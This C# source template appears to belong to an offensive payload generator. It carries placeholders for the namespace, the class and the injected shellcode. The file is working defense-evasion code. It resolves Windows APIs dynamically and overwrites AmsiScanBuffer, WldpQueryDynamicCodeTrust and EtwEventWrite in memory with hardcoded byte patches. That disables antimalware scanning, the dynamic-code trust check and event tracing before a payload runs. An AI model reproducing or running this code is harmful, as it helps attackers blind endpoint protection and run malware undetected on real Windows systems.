using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

using DynamicInvoke = DInvoke.DynamicInvoke;


namespace ####NAMESPACE####
{

    internal class Zetsuei
    {
        //####SHELLCODE####
        public string fn;
        public byte[] bytes;
        public Int32 offset;

        public Zetsuei(string fn, byte[] bytes, Int32 offset)
        {
            this.fn = fn;
            this.bytes = bytes;
            this.offset = offset;
        }
    }
    public static class ####CLASS####
    {
        public static bool ####FUNCTION####(string bincode)
        {

            int code = Convert.ToInt32(bincode, 2);
            if (code > 7) {
                return false;
            }
            List<bool> result = new List<bool> {};

            Dictionary<string, Zetsuei> map = new Dictionary<string, Zetsuei>();

            if (code >= 0x04) {
                map.Add("amsi.dll", new Zetsuei("AmsiScanBuffer", new byte[] { 0x31, 0xff, 0x90 }, 0x001b));
            }
            if (code == 0x02 || code == 0x03 || code == 0x06 || code == 0x07) {
                map.Add("wldp.dll", new Zetsuei("WldpQueryDynamicCodeTrust", new byte[] { 0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0xFC, 0xB9, 0x3A, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x48, 0x8B, 0x8C, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x07, 0xF7, 0x00, 0x00, 0xE8, 0x5C, 0xF7, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8D, 0xA5, 0xC8, 0x00, 0x00, 0x00, 0x5F, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC }, 0x0000));
            }
            if (code % 2 == 1) {
                // x86 patch
                // map.Add("ntdll.dll", new Zetsuei("EtwEventWrite", new byte[] { 0xc2, 0x14, 0x00, 0x00 }, 0x0000));
                map.Add("ntdll.dll", new Zetsuei("EtwEventWrite", new byte[] { 0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 }, 0x0000));
            }

            K32 k32 = new K32();

            foreach (string k in map.Keys)
            {
                Console.WriteLine("[*] Disarming {0}", k);
                var getModuleHandleA = (GetModuleHandleA)k32.ChaseFunction("GetModuleHandleA");
                var TargetDLL = getModuleHandleA(k);
                if (TargetDLL == IntPtr.Zero)
                {

                    TargetDLL = DynamicInvoke.Generic.LoadModuleFromDisk(k);
                    if (TargetDLL == IntPtr.Zero)
                    {
                        Console.WriteLine("  [-] FAIL: Get Handle to {0}", k);
                        result.Add(false);
                        continue;
                    }
                }

                Thread.Sleep(1000);

                Zetsuei m;
                map.TryGetValue(k, out m);

                var getProcAddress = (GetProcAddress)k32.ChaseFunction("GetProcAddress");
                var buffptr = getProcAddress(TargetDLL, m.fn);
                if (buffptr == IntPtr.Zero)
                {
                    Console.WriteLine("  [-] FAIL: Get Handle to {0}", m.fn);
                    result.Add(false);
                    continue;
                }

                var dwSize = (UIntPtr)m.bytes.Length;
                uint oldProtection;

                var virtualProtect = (VirtualProtect)k32.ChaseFunction("VirtualProtect");
                if (!virtualProtect(buffptr, dwSize, 0x40, out oldProtection))
                {
                    Console.WriteLine("  [-] FAIL: Call to VirtualProtect -> Enable Write");
                    result.Add(false);
                    continue;
                }

                var unmanagedPointer = Marshal.AllocHGlobal((Int32)dwSize);
                Marshal.Copy(m.bytes, 0, unmanagedPointer, (Int32)dwSize);

                var copyMemory = (RtlMoveMemory)k32.ChaseFunction("RtlMoveMemory");
                copyMemory(buffptr + m.offset, unmanagedPointer, (Int32)dwSize);

                Console.WriteLine("  [+] Success. {0} Patched!", k);
                Console.WriteLine("  [*] Restoring memory protection...");
                uint newProtection;

                if (!virtualProtect(buffptr, dwSize, oldProtection, out newProtection))
                {
                    Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Disable Write");
                    result.Add(false);
                    continue;
                }
                Console.WriteLine("  [+] Success");
                result.Add(true);
            }
            return !result.Contains(false);
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr LoadLibrary(string name);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetModuleHandleA(string name);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate void RtlMoveMemory(IntPtr dest, IntPtr src, int size);

        internal class K32
        {

            public string name;

            public object ChaseFunction(string fname)
            {
                var type = (from assembly in AppDomain.CurrentDomain.GetAssemblies()
                            from t in assembly.GetTypes()
                            where t.Name == fname
                            select t).FirstOrDefault();
                this.CheckNull(type, fname + " not found");
                var p = DynamicInvoke.Generic.GetLibraryAddress(this.name, fname, true);
                this.CheckNullPtr(p, fname);
                var x = Marshal.GetDelegateForFunctionPointer(p, type);
                this.CheckNull(x, "GetDelegateForFunctionPointer");
                return x;
            }

            public K32()
            {
                this.name = "kernel32.dll";
            }


            public void CheckNull(object test, string label)
            {
                if (test == null)
                {
                    Console.WriteLine("Error: {0} is null", label);
                    Environment.Exit(1);
                }
            }
            public void CheckNullPtr(IntPtr test, string label)
            {
                if (test == IntPtr.Zero)
                {
                    Console.WriteLine("Error: {0} is INtPtr.Zero", label);
                    Environment.Exit(1);
                }
            }

        }
    }
}